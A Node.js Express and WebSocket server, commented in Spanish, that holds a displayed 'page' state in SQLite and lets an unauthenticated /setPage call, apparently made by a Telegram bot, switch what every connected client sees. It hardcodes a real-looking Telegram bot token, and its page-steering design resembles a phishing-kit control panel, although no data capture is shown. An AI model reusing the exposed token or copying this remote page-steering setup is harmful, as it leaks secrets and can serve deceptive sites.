const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const Database = require("better-sqlite3");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const cors = require("cors");
const path = require("path");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// 🛠 Middlewares
app.use(express.json());
app.use(cookieParser());
app.use(cors());

// 🔥 Servir archivos estáticos
app.use(express.static(path.join(__dirname, "public")));

// 🗄️ Base de datos SQLite
const db = new Database("control.db", { verbose: console.log });
db.exec("CREATE TABLE IF NOT EXISTS control (id INTEGER PRIMARY KEY, pagina TEXT)");
db.prepare("INSERT OR IGNORE INTO control (id, pagina) VALUES (1, 'loader')").run();

// 🔐 Credenciales de Telegram
const TELEGRAM_BOTS = [
    { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "TU_CHAT_ID" }
];

// 📩 Función para enviar mensajes a Telegram
async function sendTelegramMessage(message) {
    try {
        for (const bot of TELEGRAM_BOTS) {
            await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                chat_id: bot.chatId,
                text: message,
                parse_mode: "MarkdownV2"
            });
        }
        console.log("✅ Mensaje enviado a Telegram");
    } catch (error) {
        console.error("❌ Error enviando mensaje a Telegram:", error.message);
    }
}

// 📌 Endpoint para verificar el estado de la página
app.get("/check", (req, res) => {
    const row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
    res.json({ pagina: row ? row.pagina : "loader" });
});

// 🏠 Ruta principal
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 🔌 WebSockets para actualización en tiempo real
wss.on("connection", (ws) => {
    console.log("🔌 Cliente WebSocket conectado");

    // 🔥 Ahora obtiene el estado real desde la base de datos
    const row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
    const paginaActual = row ? row.pagina : "loader";

    console.log(`📌 Página actual enviada al cliente: ${paginaActual}`);
    ws.send(paginaActual); // Enviar la página real al cliente

    ws.on("close", () => {
        console.log("🔌 Cliente WebSocket desconectado");
    });
});

// ⚡ Endpoint para cambiar la página (usado por el bot)
app.post("/setPage", (req, res) => {
    const { pagina } = req.body;

    if (!pagina) {
        return res.status(400).json({ error: "Falta el parámetro 'pagina'" });
    }

    db.prepare("INSERT OR REPLACE INTO control (id, pagina) VALUES (1, ?)").run(pagina);
    console.log(`✅ Página cambiada a: ${pagina}`);

    // Notificar a todos los clientes WebSocket
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(pagina);
        }
    });

    res.json({ message: "Página actualizada" });
});

// 🚀 Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🌍 Servidor corriendo en http://0.0.0.0:${PORT}`));